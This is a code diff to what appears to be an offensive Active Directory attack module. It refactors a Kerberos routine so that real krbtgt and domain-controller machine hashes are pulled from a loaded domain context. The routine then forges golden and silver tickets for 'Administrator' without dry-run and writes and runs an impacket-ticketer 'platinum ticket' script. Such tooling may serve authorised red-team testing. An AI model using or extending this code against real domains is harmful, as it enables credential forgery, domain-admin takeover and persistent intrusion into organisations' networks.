@@ -13,7 +13,7 @@ import {
 } from "../ad_exploit.ts"
 import { auditADCS } from "../adcs_audit.ts"
 import { brokerExec, liveRequired, writeArtifact } from "./_base.ts"
-import { loadBestCredential, runIfTool, step, type ExecStep } from "./_integrations.ts"
+import { loadAdContext, loadBestCredential, runIfTool, step, type ExecStep } from "./_integrations.ts"
 import { runDiamondTicket } from "./_operational.ts"
 
 export interface KerberosAdvancedResult {
@@ -33,17 +33,20 @@ export async function runKerberosAdvanced(opts: {
   dc?: string
 }): Promise<KerberosAdvancedResult> {
   liveRequired("ares_kerberos_advanced", opts)
-  const domain = opts.domain ?? "CORP.LOCAL"
-  const domainSid = opts.domainSid ?? "S-1-5-21-0000000000-0000000000-0000000000"
-  const dc = opts.dc ?? domain.split(".")[0] ?? "DC01"
+  const ad = loadAdContext({ domain: opts.domain, target: opts.dc })
+  const domain = opts.domain ?? ad.domain
+  const domainSid = opts.domainSid ?? ad.domainSid ?? "S-1-5-21-0000000000-0000000000-0000000000"
+  const dc = opts.dc ?? ad.dcName ?? ad.dcHost ?? domain.split(".")[0] ?? "DC01"
   const cred = loadBestCredential()
+  const krbtgtHash = opts.krbtgtHash ?? ad.krbtgtHash
+  const dcMachineHash = opts.dcMachineHash ?? ad.dcMachineHash
   const techniques: string[] = []
   const artifacts: string[] = []
   const steps: ExecStep[] = []
   let executed = false
 
   try {
-    const golden = forgeGoldenTicket("Administrator", domainSid, opts.krbtgtHash ?? cred?.secret ?? "aad3b435b51404eeaad3b435b51404ee", { dryRun: false, domain })
+    const golden = forgeGoldenTicket("Administrator", domainSid, krbtgtHash ?? cred?.secret ?? "aad3b435b51404eeaad3b435b51404ee", { dryRun: false, domain })
     techniques.push("golden_ticket")
     if (golden.ticketPath) { artifacts.push(golden.ticketPath); executed = true }
     steps.push(step("golden_ticket", !!golden.ticketPath, golden.ticketPath ?? "metadata only"))
@@ -53,7 +56,7 @@ export async function runKerberosAdvanced(opts: {
   }
 
   try {
-    const silver = forgeSilverTicket("Administrator", domainSid, opts.dcMachineHash ?? cred?.secret ?? "HASH", `cifs/${dc}`, { dryRun: false, domain })
+    const silver = forgeSilverTicket("Administrator", domainSid, dcMachineHash ?? cred?.secret ?? "HASH", `cifs/${dc}`, { dryRun: false, domain })
     techniques.push("silver_ticket")
     if (silver.ticketPath) artifacts.push(silver.ticketPath)
     steps.push(step("silver_ticket", !!silver.ticketPath, silver.ticketPath ?? "metadata"))
@@ -61,7 +64,7 @@ export async function runKerberosAdvanced(opts: {
     steps.push(step("silver_ticket", false, String((err as Error).message)))
   }
 
-  const dcHash = opts.dcMachineHash ?? cred?.secret ?? "aad3b435b51404eeaad3b435b51404ee"
+  const dcHash = dcMachineHash ?? cred?.secret ?? "aad3b435b51404eeaad3b435b51404ee"
   const platinumCmd = `impacket-ticketer -nthash ${dcHash} -domain-sid ${domainSid} -domain ${domain} -extra-sid S-1-5-9 DC$`
   artifacts.push(writeArtifact("kerberos", "platinum_ticket.sh", `#!/bin/bash\n${platinumCmd}\n`, 0o755))
   const platinum = await runIfTool("impacket-ticketer", "platinum_ticket", `${platinumCmd} 2>&1 | head -c 500`)
